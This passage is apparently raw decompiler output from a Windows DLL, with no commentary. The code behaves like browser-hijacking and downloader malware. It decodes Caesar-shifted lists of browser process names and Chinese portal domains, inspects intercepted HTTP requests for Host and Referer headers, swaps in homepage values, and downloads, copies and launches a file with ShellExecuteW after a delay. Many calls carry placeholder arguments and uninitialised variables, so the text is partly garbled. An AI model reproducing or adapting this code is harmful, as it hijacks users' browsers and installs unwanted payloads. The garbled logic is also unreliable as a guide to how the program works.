        wsprintfW((int16_t *)&g173, (int16_t *)&g173);
        int32_t * v52 = (int32_t *)(v42 - 32); // 0x10015e78
        *v52 = v27;
        int32_t v53 = v42 - 36; // 0x10015e7f
        int32_t * v54 = (int32_t *)v53; // 0x10015e7f
        *v54 = v25;
        int32_t v55 = function_10017510((int32_t)&g173, (int32_t)&g173); // 0x10015e80
        v40 = v43;
        if (v55 == 0) {
            // break -> 0x100161e2
            break;
        }
        // 0x10015e90
        *v43 = 398;
        *v44 = 0;
        int32_t v56; // bp-2090, 0x10015d30
        *v45 = (int32_t)&v56;
        v28 = NULL;
        _memset(NULL, (int32_t)&g173, (int32_t)&g173);
        *v47 = v27;
        *v48 = v29;
        *v50 = (int32_t)L"url";
        function_10017850((int32_t)&g173, (int32_t)&g173, (int32_t)&g173);
        v41 = v42;
        if ((int16_t)(int32_t)v28 == 0) {
            goto lab_0x100161cc_2;
        } else {
            // 0x10015ed4
            *v43 = v27;
            *v44 = v31;
            *v45 = (int32_t)L"uid";
            function_10017850((int32_t)&g173, (int32_t)&g173, (int32_t)&g173);
            *v47 = v27;
            *v48 = v33;
            *v50 = (int32_t)L"file";
            function_10017850((int32_t)&g173, (int32_t)&g173, (int32_t)&g173);
            int32_t v57; // bp-3544, 0x10015d30
            *v43 = (int32_t)&v57;
            *v44 = 0x20219;
            *v45 = 0;
            *v47 = v31;
            *v48 = phkResult;
            int32_t v58 = RegOpenKeyExW(&g173, (int16_t *)&g173, (int32_t)&g173, (int32_t)&g173, (int32_t **)&g173); // 0x10015f23
            if (v58 != 0) {
                // 0x10015f3f
                *v50 = (int32_t)&g111;
                *v51 = 0;
                *v52 = v33;
                *v54 = (int32_t)L"inst";
                uint32_t v59 = GetPrivateProfileIntW((int16_t *)&g173, (int16_t *)&g173, (int32_t)&g173, (int16_t *)&g173); // 0x10015f52
                int32_t v60 = v42 - 40; // 0x10015f58
                int32_t * v61 = (int32_t *)v60; // 0x10015f58
                *v61 = 0;
                uint32_t v62 = __time64(); // 0x10015f5c
                int32_t v63 = v62 < v59; // 0x10015f68
                v41 = v53;
                if (phkResult - v63 < 0) {
                    goto lab_0x100161cc_2;
                } else {
                    int32_t v64 = 0; // 0x10015f76
                    v41 = v53;
                    if (v62 - v59 < 0x28de80 == phkResult <= v63) {
                        goto lab_0x100161cc_2;
                    } else {
                        int16_t v65 = *(int16_t *)(v64 + (int32_t)&g115); // 0x10015f90
                        *(int16_t *)(v64 + v34) = v65;
                        v64 += 2;
                        while (v65 != 0) {
                            // 0x10015f90
                            v65 = *(int16_t *)(v64 + (int32_t)&g115);
                            *(int16_t *)(v64 + v34) = v65;
                            v64 += 2;
                        }
                        // 0x10015fa7
                        *v61 = v36;
                        bool v66 = PathFileExistsW((int16_t *)&g173); // 0x10015fb4
                        int32_t v67 = v60; // 0x10015fb8
                        if (!v66) {
                            // 0x10015fba
                            *(int32_t *)(v42 - 44) = (int32_t)v66;
                            v67 = v42 - 48;
                            *(int32_t *)v67 = v36;
                            CreateDirectoryW((int16_t *)&g173, (struct _SECURITY_ATTRIBUTES *)&g173);
                        }
                        int32_t v68 = v67 - 4; // 0x10015fce
                        *(int32_t *)v68 = v36;
                        bool v69 = PathFileExistsW((int16_t *)&g173); // 0x10015fcf
                        int32_t v70 = 0; // 0x10015fd3
                        v41 = v68;
                        if (!v69) {
                            goto lab_0x100161cc_2;
                        } else {
                            while (true) {
                                int16_t v71 = *(int16_t *)(v70 + v34); // 0x10015fe0
                                *(int16_t *)(v3 - 1176 + v70) = v71;
                                v70 += 2;
                                if (v71 == 0) {
                                    goto lab_0x10016001;
                                }
                            }
                            goto lab_0x1001600d;
                        }
                    }
                }
            } else {
                // 0x10015f2d
                *v50 = v57;
                RegCloseKey(&g173);
                v41 = v49;
                goto lab_0x100161cc_2;
            }
        }
    }
    goto lab_0x100161e2;
  lab_0x10016001:;
    // 0x10016001
    int32_t v72; // 0x10015d30
    int32_t v73 = v72;
    int32_t v74 = v73 + 2; // 0x10016001
    int16_t v75 = *(int16_t *)v74; // 0x10016001
    v72 = v74;
    if (v75 != 0) {
        goto lab_0x10016001;
    } else {
        goto lab_0x1001600d;
    }
  lab_0x10016036:;
    // 0x10016036
    int32_t v76; // 0x10015d30
    int32_t v77 = v76;
    int32_t v78 = v77 + 2; // 0x10016036
    int16_t v79 = *(int16_t *)v78; // 0x10016036
    v76 = v78;
    if (v79 != 0) {
        goto lab_0x10016036;
    } else {
        goto lab_0x10016042;
    }
  lab_0x100160d1:;
    // 0x100160d1
    int32_t v80; // 0x10015d30
    int32_t v81 = v80;
    int32_t v82 = v81 + 2; // 0x100160d1
    int16_t v83 = *(int16_t *)v82; // 0x100160d1
    v80 = v82;
    if (v83 != 0) {
        goto lab_0x100160d1;
    } else {
        goto lab_0x100160dd;
    }
  lab_0x100161cc_2:
    // 0x100161cc
    v39 = v41;
    v37++;
    if (v37 >= 10) {
        // 0x100161cc
        v40 = (int32_t *)(v39 - 4);
        goto lab_0x100161e2;
    }
    goto lab_0x10015e40;
  lab_0x1001600d:
    // 0x1001600d
    *(int32_t *)v74 = 92;
    int32_t v84 = v33; // 0x1001601d
    int32_t v85; // 0x10015d30
    int32_t v86; // 0x10016023
    while (true) {
        int32_t v87 = v84;
        int16_t v88 = *(int16_t *)v87; // 0x10016020
        v86 = v87 + 2;
        v84 = v86;
        v76 = v85;
        if (v88 == 0) {
            goto lab_0x10016036;
        }
    }
    goto lab_0x10016042;
  lab_0x10016042:;
    uint32_t v89 = v86 - v33; // 0x10016031
    uint32_t v90 = v89 / 4; // 0x10016044
    __asm_rep_movsd_memcpy((char *)v78, (char *)&v32, v90);
    int32_t v91; // 0x10015d30
    int32_t v92; // 0x10015d30
    *(int32_t *)(v91 - 8) = v92;
    int32_t v93; // 0x10015d30
    char * v94 = (char *)(v78 + v90 * v93); // 0x10016057
    __asm_rep_movsb_memcpy(v94, v94, v89 & 2);
    PathRemoveExtensionW((int16_t *)&g173);
    int32_t v95 = v85; // 0x10016068
    int32_t v96 = v95;
    int32_t v97 = v96 + 2; // 0x10016070
    int16_t v98 = *(int16_t *)v97; // 0x10016070
    v95 = v97;
    while (v98 != 0) {
        // 0x10016070
        v96 = v95;
        v97 = v96 + 2;
        v98 = *(int16_t *)v97;
        v95 = v97;
    }
    // 0x1001607c
    *(int32_t *)v97 = 0x64002e;
    *(int32_t *)(v96 + 6) = 0x740061;
    int32_t v99 = v91 - 12; // 0x1001609a
    *(int32_t *)v99 = v92;
    *(int16_t *)(v96 + 10) = 0;
    bool v100 = PathFileExistsW((int16_t *)&g173); // 0x1001609f
    v41 = v99;
    if (v100) {
        goto lab_0x100161cc_2;
    } else {
        int32_t v101 = v100; // 0x10015d30
        while (true) {
            int32_t v102 = v101;
            int16_t v103 = *(int16_t *)(v102 + v34); // 0x100160b0
            int32_t v104; // 0x10015d30
            *(int16_t *)(v104 + v102) = v103;
            v101 = v102 + 2;
            int32_t v105; // 0x10015d30
            v80 = v105;
            if (v103 == 0) {
                goto lab_0x100160d1;
            }
        }
        goto lab_0x100160dd;
    }
  lab_0x100160dd:
    // 0x100160dd
    *(int32_t *)v82 = 0x7e005c;
    *(int32_t *)(v81 + 6) = 0x6d0074;
    int32_t * v106 = (int32_t *)(v91 - 16); // 0x100160fa
    *v106 = v31;
    int32_t * v107 = (int32_t *)(v91 - 20); // 0x100160fb
    *v107 = (int32_t)L"try";
    *(int32_t *)(v81 + 10) = 112;
    function_100182c0((int32_t)&g173, (int32_t)&g173);
    int32_t * v108 = (int32_t *)(v91 - 24); // 0x1001610e
    int32_t v109; // 0x10015d30
    *v108 = v109;
    int32_t v110 = v91 - 28; // 0x10016115
    int32_t * v111 = (int32_t *)v110; // 0x10016115
    *v111 = v29;
    int32_t v112 = function_10018d30((int32_t)&g173, (int32_t)&g173); // 0x10016116
    if (v112 == 0) {
        int32_t errorCode = GetLastError(); // 0x10016198
        *v106 = errorCode;
        *v107 = v31;
        *v108 = (int32_t)L"%s, errno: %d";
        int32_t v113; // 0x10015d30
        *v111 = v113;
        wsprintfW((int16_t *)&g173, (int16_t *)&g173);
        *(int32_t *)(v91 - 32) = v113;
        *(int32_t *)(v91 - 36) = (int32_t)L"try failed";
        function_100182c0((int32_t)&g173, (int32_t)&g173);
        v41 = v99;
    } else {
        // 0x10016126
        *v106 = v31;
        *v107 = (int32_t)L"got";
        function_100182c0((int32_t)&g173, (int32_t)&g173);
        *v106 = 0;
        *v107 = v92;
        *v108 = v109;
        CopyFileW((int16_t *)&g173, (int16_t *)&g173, (bool)&g173);
        *v111 = v109;
        DeleteFileW((int16_t *)&g173);
        int32_t * v114 = (int32_t *)(v91 - 32); // 0x10016163
        *v114 = v27;
        int32_t * v115 = (int32_t *)(v91 - 36); // 0x10016164
        *v115 = (int32_t)L"delay";
        int32_t v116 = function_10017990((int32_t)&g173, (int32_t)&g173); // 0x10016169
        if (v116 != 0) {
            // 0x10016182
            *v114 = v31;
            *v115 = (int32_t)L"later";
            function_100182c0((int32_t)&g173, (int32_t)&g173);
            v41 = v110;
        } else {
            // 0x10016175
            function_100158b0();
            v41 = v110;
        }
    }
    goto lab_0x100161cc_2;
  lab_0x100161e2:
    // 0x100161e2
    *v40 = phkResult;
    RegCloseKey(&g173);
    // 0x100161f2
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10016210 - 0x1001636c
int32_t function_10016210(int32_t a1) {
    // 0x10016210
    if (a1 == 0) {
        // 0x1001622a
        return _40___security_check_cookie_40_4();
    }
    int16_t * v1 = PathFindFileNameW((int16_t *)a1); // 0x1001623a
    if (v1 == NULL) {
        // 0x1001635d
        return _40___security_check_cookie_40_4();
    }
    int32_t v2 = (int32_t)v1; // 0x1001623a
    int16_t v3 = 0; // bp-2012, 0x10016259
    int32_t v4; // bp-2010, 0x10016210
    _memset(&v4, 0, 2000);
    int32_t v5; // bp-4, 0x10016210
    int32_t v6 = (int32_t)&v5 - 2008; // 0x10016277
    int32_t v7 = 0; // 0x1001626a
    int16_t v8 = *(int16_t *)(v7 + (int32_t)&g28); // 0x10016270
    *(int16_t *)(v7 + v6) = v8;
    v7 += 2;
    while (v8 != 0) {
        // 0x10016270
        v8 = *(int16_t *)(v7 + (int32_t)&g28);
        *(int16_t *)(v7 + v6) = v8;
        v7 += 2;
    }
    int32_t v9 = v2;
    int32_t v10 = v9 + 2; // 0x10016293
    while (*(int16_t *)v9 != 0) {
        // 0x10016290
        v9 = v10;
        v10 = v9 + 2;
    }
    // 0x1001629b
    int32_t v11; // bp-2014, 0x10016210
    int32_t v12 = &v11; // 0x100162a4
    int32_t v13 = v12; // 0x100162a7
    v13 += 2;
    while (*(int16_t *)v13 != 0) {
        // 0x100162b0
        v13 += 2;
    }
    uint32_t v14 = v10 - v2; // 0x100162a2
    uint32_t v15 = v14 / 4; // 0x100162be
    __asm_rep_movsd_memcpy((char *)v13, (char *)v1, v15);
    bool v16; // 0x10016210
    char * v17 = (char *)(v13 + v15 * (v16 ? -4 : 4)); // 0x100162c8
    __asm_rep_movsb_memcpy(v17, v17, v14 & 3);
    int32_t v18 = v12; // 0x100162d0
    v18 += 2;
    while (*(int16_t *)v18 != 0) {
        // 0x100162d3
        v18 += 2;
    }
    // 0x100162df
    *(int32_t *)v18 = 44;
    __wcslwr((int32_t *)&v3);
    int32_t v19 = &v3; // 0x100162f6
    int32_t v20 = v19; // 0x10016301
    while (*(int16_t *)v20 != 0) {
        // 0x10016302
        v20 += 2;
    }
    int32_t v21 = &v4; // 0x100162fe
    int32_t v22 = 0; // 0x10016311
    if (v20 != v21) {
        int16_t * v23 = (int16_t *)(2 * v22 + v6); // 0x10016318
        *v23 = *v23 - 3;
        int32_t v24 = v19;
        int32_t v25 = v24 + 2; // 0x10016333
        while (*(int16_t *)v24 != 0) {
            // 0x10016330
            v24 = v25;
            v25 = v24 + 2;
        }
        // 0x1001633b
        v22++;
        while (v22 < (v25 - v21) / 2) {
            // 0x10016313
            v23 = (int16_t *)(2 * v22 + v6);
            *v23 = *v23 - 3;
            v24 = v19;
            v25 = v24 + 2;
            while (*(int16_t *)v24 != 0) {
                // 0x10016330
                v24 = v25;
                v25 = v24 + 2;
            }
            // 0x1001633b
            v22++;
        }
    }
    // 0x10016343
    _wcsstr(L")lmbo^+bub)fbumilob+bub)`eoljb+bub)cfobclu+bub)/012bumilobo+bub)/012`eoljb+bub)03-pb+bub)03-`eoljb+bub)_^far_oltpbo+bub)_^farmi^vbo_oltpbo+bub)_^farsfabl_oltpbo+bub)`eoljfrj+bub)dobbk_oltpbo+bub)e^l./0_oltpbo+bub)fbp^ka_lu+bub)f`eoljb+bub)ifb_^l+bub)j^uqelk+bub)nn_oltpbo+bub)p^c^of+bub)pldlrbumilobo+bub)q^l_oltpbo+bub)qebtloia+bub)qqo^sbibo+bub)r`_oltpbo+bub)ci^pemi^v+bub)", &v3);
    // 0x1001635d
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10016370 - 0x100163d0
int32_t function_10016370(void) {
    // 0x10016370
    int32_t v1; // 0x10016370
    if (v1 == 0) {
        // 0x10016374
        return 0;
    }
    int16_t * v2 = PathFindFileNameW((int16_t *)v1); // 0x10016378
    if (v2 == NULL) {
        // 0x10016374
        return 0;
    }
    int16_t * v3 = __wcsdup(v2); // 0x10016384
    __wcslwr((int32_t *)v3);
    if (_wcsstr(v3, L"tray") != NULL || _isdigit((int32_t)*v3) != 0) {
        // 0x100163a4
        _free((int32_t *)v3);
        return 1;
    }
    // 0x100163c4
    _free((int32_t *)v3);
    return 0;
}

// Address range: 0x100163d0 - 0x100167a4
int32_t function_100163d0(void) {
    // 0x100163d0
    int32_t v1; // 0x100163d0
    if (v1 == 0 || (int16_t)v1 == 0) {
        // 0x10016793
        return _40___security_check_cookie_40_4();
    }
    int16_t * v2 = (int16_t *)v1; // 0x100163fd
    int16_t * v3 = v2; // bp-628, 0x100163fd
    if (_wcsstr(v2, L"http") == NULL) {
        // 0x1001640a
        return _40___security_check_cookie_40_4();
    }
    // 0x1001641e
    int32_t v4; // 0x100163d0
    v3 = (int16_t *)v4;
    int32_t v5; // bp-608, 0x100163d0
    __asm_rep_movsd_memcpy((char *)&v5, (char *)L"zzz1kdr4561frp", 7);
    int32_t v6; // bp-548, 0x100163d0
    __asm_rep_movsd_memcpy((char *)&v6, (char *)L"zzz169331frp", 6);
    int32_t v7; // bp-428, 0x100163d0
    __asm_rep_movsd_memcpy((char *)&v7, (char *)L"zzz156781frp", 6);
    int32_t v8; // bp-368, 0x100163d0
    __asm_rep_movsd_memcpy((char *)&v8, (char *)L"zzz1gxed1frp", 6);
    int32_t v9; // bp-248, 0x100163d0
    __asm_rep_movsd_memcpy((char *)&v9, (char *)L"4561vrjrx1frp", 7);
    int32_t v10; // bp-188, 0x100163d0
    __asm_rep_movsd_memcpy((char *)&v10, (char *)L"gdrkdqj1tt1frp", 7);
    int32_t v11; // bp-126, 0x100163d0
    _memset(&v11, 0, 118);
    int32_t v12 = (int32_t)__wcsdup(v2); // 0x100166eb
    function_10018f70(v12, 3);
    int32_t v13 = (int32_t)&v3; // 0x100166fa
    int32_t * v14 = (int32_t *)(v13 - 4);
    int32_t * v15 = (int32_t *)(v13 - 8);
    int32_t v16 = 0; // 0x100166ff
    int32_t v17 = &v5;
    if (*(int16_t *)v17 != 0) {
        // 0x1001670b
        *v14 = v17;
        *v15 = v12;
        if (_wcsstr((int16_t *)&g173, (int16_t *)&g173) != NULL) {
            // 0x10016775
            *v14 = v12;
            _free(&g173);
            return _40___security_check_cookie_40_4();
        }
    }
    // 0x10016719
    v16++;
    int32_t v18 = v17 + 60; // 0x10016720
    while (v16 < 10) {
        // 0x10016705
        v17 = v18;
        if (*(int16_t *)v17 != 0) {
            // 0x1001670b
            *v14 = v17;
            *v15 = v12;
            if (_wcsstr((int16_t *)&g173, (int16_t *)&g173) != NULL) {
                // 0x10016775
                *v14 = v12;
                _free(&g173);
                return _40___security_check_cookie_40_4();
            }
        }
        // 0x10016719
        v16++;
        v18 = v17 + 60;
    }
    // 0x10016722
    *v14 = v12;
    _free(&g173);
    *v15 = 0;
    int32_t v19 = __time64(); // 0x1001672a
    int32_t v20 = (int32_t)g127 + (int32_t)(v19 < g126); // 0x1001673c
    if (v20 > 0) {
        // 0x10016780
        return _40___security_check_cookie_40_4();
    }
    if (v19 - g126 < 601 == v20 == 0) {
        // 0x10016780
        return _40___security_check_cookie_40_4();
    }
    // 0x10016754
    g126 = v19;
    g127 = 0;
  lab_0x1001675f:
    // 0x1001675f
    return _40___security_check_cookie_40_4();
}

// Address range: 0x100167b0 - 0x10016809
int32_t function_100167b0(int32_t a1) {
    if (a1 == 0) {
        // 0x10016802
        return 0;
    }
    // 0x100167bb
    int32_t v1; // bp-16, 0x100167b0
    int32_t v2 = &v1; // 0x100167c3
    int32_t v3; // 0x100167b0
    for (int32_t i = 65; i > 0; i--) {
        // 0x100167c8
        v3 = v2;
        v2 = v3 - 4;
        *(int32_t *)v2 = 3000;
        Sleep((int32_t)&g173);
    }
    int32_t * v4 = (int32_t *)(v3 - 8); // 0x100167d2
    *v4 = a1;
    int32_t * v5 = (int32_t *)(v3 - 12); // 0x100167d3
    *v5 = (int32_t)L"delay";
    function_100182c0((int32_t)&g173, (int32_t)&g173);
    *v4 = 1;
    *v5 = 0;
    *(int32_t *)(v3 - 16) = 0;
    *(int32_t *)(v3 - 20) = a1;
    *(int32_t *)(v3 - 24) = (int32_t)L"open";
    *(int32_t *)(v3 - 28) = 0;
    ShellExecuteW(&g173, (int16_t *)&g173, (int16_t *)&g173, (int16_t *)&g173, (int16_t *)&g173, (int32_t)&g173);
    *(int32_t *)(v3 - 32) = a1;
    g116 = 0;
    _free(&g173);
    // 0x10016802
    return 0;
}

// Address range: 0x10016810 - 0x10016a6b
int32_t function_10016810(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10) {
    int32_t v1 = a3; // bp-2524, 0x10016830
    int32_t v2 = 1998; // bp-2556, 0x1001684e
    int16_t v3 = 0; // bp-2520, 0x10016870
    int32_t v4; // bp-2518, 0x10016810
    _memset(&v4, 0, 1998);
    int16_t v5 = 0; // bp-520, 0x1001688b
    int32_t v6; // bp-518, 0x10016810
    _memset(&v6, 0, 510);
    int32_t v7 = &v5; // 0x1001689f
    function_10017850((int32_t)L"hp", v7, 0);
    int32_t v8; // bp-2552, 0x10016810
    int32_t v9 = &v8; // 0x100168aa
    int32_t v10 = v9; // 0x100168b5
    int32_t v11 = a2; // 0x100168b5
    if (v5 != 0) {
        // 0x100168bb
        v2 = a1;
        v10 = v9;
        v11 = a2;
        if (function_10016210(a1) != 0) {
            // 0x100168cc
            v10 = v9;
            v11 = a2;
            if (function_100163d0() != 0) {
                int32_t v12 = 0; // 0x10016810
                int16_t v13 = *(int16_t *)(v12 + (int32_t)&g29); // 0x100168e0
                int32_t v14; // bp-4, 0x10016810
                *(int16_t *)((int32_t)&v14 - 2516 + v12) = v13;
                v12 += 2;
                while (v13 != 0) {
                    // 0x100168e0
                    v13 = *(int16_t *)(v12 + (int32_t)&g29);
                    *(int16_t *)((int32_t)&v14 - 2516 + v12) = v13;
                    v12 += 2;
                }
                int32_t v15 = a1;
                int32_t v16 = v15 + 2; // 0x10016903
                while (*(int16_t *)v15 != 0) {
                    // 0x10016900
                    v15 = v16;
                    v16 = v15 + 2;
                }
                // 0x1001690b
                int32_t v17; // bp-2522, 0x10016810
                int32_t v18 = &v17; // 0x10016914
                int32_t v19 = v18 + 2; // 0x10016920
                int32_t v20 = v19; // 0x1001692a
                while (*(int16_t *)v19 != 0) {
                    // 0x10016920
                    v19 = v20 + 2;
                    v20 = v19;
                }
                uint32_t v21 = v16 - a1; // 0x10016912
                uint32_t v22 = v21 / 4; // 0x1001692e
                __asm_rep_movsd_memcpy((char *)v19, (char *)a1, v22);
                bool v23; // 0x10016810
                int32_t v24 = v23 ? -4 : 4; // 0x10016933
                char * v25 = (char *)(v19 + v22 * v24); // 0x10016940
                __asm_rep_movsb_memcpy(v25, v25, v21 & 3);
                int32_t v26 = v18;
                int32_t v27 = v26 + 2; // 0x10016945
                while (*(int16_t *)v27 != 0) {
                    // 0x10016945
                    v26 = v27;
                    v27 = v26 + 2;
                }
                // 0x10016951
                *(int32_t *)v27 = 0x200022;
                *(int16_t *)(v26 + 6) = 0;
                int32_t v28 = v7;
                int32_t v29 = v28 + 2; // 0x10016973
                while (*(int16_t *)v28 != 0) {
                    // 0x10016970
                    v28 = v29;
                    v29 = v28 + 2;
                }
                int32_t v30 = v18 + 2; // 0x10016986
                int32_t v31 = v30; // 0x10016990
                while (*(int16_t *)v30 != 0) {
                    // 0x10016986
                    v30 = v31 + 2;
                    v31 = v30;
                }
                uint32_t v32 = v29 - v7; // 0x10016981
                uint32_t v33 = v32 / 4; // 0x10016994
                __asm_rep_movsd_memcpy((char *)v30, (char *)&v5, v33);
                char * v34 = (char *)(v30 + v33 * v24); // 0x100169ac
                __asm_rep_movsb_memcpy(v34, v34, v32 & 2);
                function_100182c0((int32_t)&g173, (int32_t)&g173);
                function_100182c0((int32_t)L"jump_c", (int32_t)PathFindFileNameW((int16_t *)a1));
                v10 = &v2;
                v11 = &v3;
            }
        }
    }
    // 0x100169d2
    if (g116 != 0) {
        // 0x100169db
        if (function_10016370() != 0) {
            int32_t * v35 = (int32_t *)(v10 - 4); // 0x100169e6
            *v35 = a1;
            int16_t * v36 = __wcsdup((int16_t *)&g173); // 0x100169e7
            *v35 = (int32_t)&v1;
            *(int32_t *)(v10 - 8) = 0;
            *(int32_t *)(v10 - 12) = (int32_t)v36;
            *(int32_t *)(v10 - 16) = 0x100167b0;
            *(int32_t *)(v10 - 20) = 0;
            *(int32_t *)(v10 - 24) = 0;
            CreateThread((struct _SECURITY_ATTRIBUTES *)&g173, (int32_t)&g173, (int32_t (*)(int32_t *))&g173, &g173, (int32_t)&g173, &g173);
            return _40___security_check_cookie_40_4();
        }
    }
    // 0x10016a1f
    *(int32_t *)(v10 - 4) = a10;
    *(int32_t *)(v10 - 8) = a9;
    *(int32_t *)(v10 - 12) = a8;
    *(int32_t *)(v10 - 16) = a7;
    *(int32_t *)(v10 - 20) = a6;
    *(int32_t *)(v10 - 24) = a5;
    *(int32_t *)(v10 - 28) = a4;
    *(int32_t *)(v10 - 32) = v1;
    *(int32_t *)(v10 - 36) = v11;
    *(int32_t *)(v10 - 40) = a1;
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10016a70 - 0x10016a92
int32_t function_10016a70(void) {
    int32_t result = function_100104d0(&g128, 0x10016810); // 0x10016a7a
    if (result == 0) {
        // 0x10016a86
        return result;
    }
    // 0x10016a87
    g125 = 1;
    return 1;
}

// Address range: 0x10016aa0 - 0x10016ac1
int32_t function_10016aa0(int32_t a1) {
    // 0x10016aa0
    int32_t result; // 0x10016aa0
    if (g125 != 0) {
        int32_t v1 = function_10010730(&g128); // 0x10016aae
        g125 = 0;
        result = v1;
    }
    // 0x10016ac0
    return result;
}

// Address range: 0x10016ad0 - 0x10016bc7
int32_t function_10016ad0(int32_t a1, char * a2) {
    int32_t v1 = (int32_t)a2;
    int16_t v2 = 2573; // bp-40, 0x10016afa
    int32_t v3 = v1; // 0x10016b02
    while (*(char *)v3 != 0) {
        // 0x10016b04
        v3++;
    }
    // 0x10016b0b
    int32_t v4; // bp-41, 0x10016ad0
    int32_t v5 = &v4; // 0x10016b12
    int32_t v6 = v5; // 0x10016b12
    v6++;
    char * v7 = (char *)v6;
    while (*v7 != 0) {
        // 0x10016b13
        v6++;
        v7 = (char *)v6;
    }
    uint32_t v8 = v3 - v1; // 0x10016b0e
    uint32_t v9 = v8 / 4; // 0x10016b1d
    __asm_rep_movsd_memcpy(v7, a2, v9);
    bool v10; // 0x10016ad0
    char * v11 = (char *)(v6 + v9 * (v10 ? -4 : 4)); // 0x10016b2a
    __asm_rep_movsb_memcpy(v11, v11, v8 & 3);
    int32_t v12 = v5;
    int32_t v13 = v12 + 1; // 0x10016b30
    while (*(char *)v13 != 0) {
        // 0x10016b30
        v12 = v13;
        v13 = v12 + 1;
    }
    // 0x10016b38
    *(int16_t *)v13 = 0x203a;
    *(char *)(v12 + 3) = 0;
    int32_t v14 = function_1001b170(a1, &v2); // 0x10016b53
    if (v14 == 0) {
        // 0x10016bb4
        return _40___security_check_cookie_40_4();
    }
    int32_t v15 = v1; // 0x10016b5d
    while (*(char *)v15 != 0) {
        // 0x10016b64
        v15++;
    }
    int32_t v16 = v14 + 4 + v15 - v1; // 0x10016b6d
    int32_t v17 = function_1001b170(v16, (int16_t *)"\r\n"); // 0x10016b77
    if (v17 == 0) {
        // 0x10016bb4
        return _40___security_check_cookie_40_4();
    }
    int32_t v18 = v17 - v16; // 0x10016b83
    int32_t v19 = _3f__3f_2_40_YAPAXI_40_Z(v18 + 1); // 0x10016b8b
    _memcpy2(v19, v16, v18);
    *(char *)(v19 + v18) = 0;
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10016bd0 - 0x10016fc6
int32_t function_10016bd0(int32_t a1, uint32_t a2) {
    // 0x10016bd0
    if (a2 < 10 || *(int32_t *)a1 != 0x20544547 || *(char *)(a1 + 4) != 47) {
        // 0x10016bf0
        return _40___security_check_cookie_40_4();
    }
    char v1 = *(char *)(a1 + 5); // 0x10016c1a
    if (v1 != 32 == (v1 != 63)) {
        // 0x10016fb3
        return _40___security_check_cookie_40_4();
    }
    int32_t * v2 = _malloc(a2 + 1); // 0x10016c37
    int32_t v3 = (int32_t)v2; // 0x10016c37
    _memcpy2(v3, a1, a2);
    int32_t v4 = v3 + 4; // 0x10016c46
    *(char *)(v3 + a2) = 0;
    char * v5 = _strchr((char *)v4, 32); // 0x10016c50
    if (v5 == NULL) {
        // 0x10016c5c
        _free(v2);
        return _40___security_check_cookie_40_4();
    }
    // 0x10016c78
    int32_t v6; // bp-1744, 0x10016bd0
    int32_t v7 = &v6; // 0x10016c08
    int32_t v8 = (int32_t)v5 - v3; // 0x10016c78
    int32_t v9 = v8 - 4; // 0x10016c7a
    int32_t * v10 = _malloc(v8 - 3); // 0x10016c81
    int32_t v11 = (int32_t)v10; // 0x10016c81
    _memcpy2(v11, v4, v9);
    *(char *)(v9 + v11) = 0;
    int32_t v12 = function_10016ad0(v3, "User-Agent"); // 0x10016ca4
    int32_t v13 = function_10016ad0(v3, "Host"); // 0x10016cb7
    int32_t v14 = function_10016ad0(v3, "Referer"); // 0x10016cca
    int32_t v15 = v7; // 0x10016cda
    int16_t * v16; // 0x10016bd0
    int32_t v17; // 0x10016bd0
    if (v12 == 0) {
        goto lab_0x10016f7e;
    } else {
        // 0x10016ce0
        v17 = v7;
        if (v13 == 0) {
            goto lab_0x10016f6f_4;
        } else {
            // 0x10016ce8
            v16 = (int16_t *)v13;
            if (v14 == 0) {
                goto lab_0x10016cfe;
            } else {
                // 0x10016cec
                v17 = v7;
                if (function_1001b170(v14, v16) != 0) {
                    goto lab_0x10016f6f_4;
                } else {
                    goto lab_0x10016cfe;
                }
            }
        }
    }
  lab_0x10016f6f_4:
    // 0x10016f6f
    v15 = v17;
    *(int32_t *)(v15 - 4) = v12;
    _free(&g173);
    goto lab_0x10016f7e;
  lab_0x10016f7e:;
    int32_t * v18 = (int32_t *)(v15 - 4);
    if (v13 != 0) {
        // 0x10016f82
        *v18 = v13;
        _free(&g173);
    }
    if (v14 != 0) {
        // 0x10016f95
        *v18 = v14;
        _free(&g173);
    }
    // 0x10016f9e
    *v18 = v11;
    _free(&g173);
    *(int32_t *)(v15 - 8) = v3;
    _free(&g173);
    // 0x10016fb3
    return _40___security_check_cookie_40_4();
  lab_0x10016cfe:;
    char * v19 = (char *)v13; // 0x10016cc4
    int32_t v20; // bp-316, 0x10016bd0
    __asm_rep_movsd_memcpy((char *)&v20, "zzz1kdr4561frp/zzz169331frp/kdr16931fq/zzz156781frp/zzz1gxed1frp/kdr1tt1frp/4561vrjrx1frp/gdrkdqj1tt1frp", 26);
    function_10018fb0(&v20, 3);
    __strlwr(v19);
    int32_t v21 = function_1001b170((int32_t)&v20, v16); // 0x10016d33
    v17 = v7;
    char lpMultiByteStr; // bp-108, 0x10016bd0
    char * v22; // bp-1716, 0x10016bd0
    char lpMultiByteStr2; // bp-208, 0x10016bd0
    int32_t v23; // 0x10016dc7
    int32_t v24; // 0x10016ea9
    int32_t v25; // 0x10016ebc
    if (v21 == 0) {
        goto lab_0x10016f6f_4;
    } else {
        int16_t lpWideCharStr = 0; // bp-716, 0x10016d52
        int32_t v26; // bp-714, 0x10016bd0
        _memset(&v26, 0, 198);
        int16_t lpWideCharStr2 = 0; // bp-516, 0x10016d6d
        int32_t v27; // bp-514, 0x10016bd0
        _memset(&v27, 0, 198);
        lpMultiByteStr = 0;
        int32_t v28; // bp-107, 0x10016bd0
        _memset(&v28, 0, 99);
        lpMultiByteStr2 = 0;
        int32_t v29; // bp-207, 0x10016bd0
        _memset(&v29, 0, 99);
        int32_t v30 = function_10017850((int32_t)L"hp", (int32_t)&lpWideCharStr, 0); // 0x10016daf
        v17 = v7;
        if (v30 == 0) {
            goto lab_0x10016f6f_4;
        } else {
            // 0x10016dbf
            v23 = &lpWideCharStr2;
            v17 = v7;
            if (function_10017850((int32_t)L"hp2", v23, 0) == 0) {
                goto lab_0x10016f6f_4;
            } else {
                // 0x10016ddd
                WideCharToMultiByte(936, 0, &lpWideCharStr, -1, &lpMultiByteStr, 100, NULL, NULL);
                int32_t v31 = 936; // bp-1808, 0x10016e17
                WideCharToMultiByte(936, 0, &lpWideCharStr2, -1, &lpMultiByteStr2, 100, NULL, NULL);
                v22 = (char *)0x70747468;
                int32_t v32 = v13;
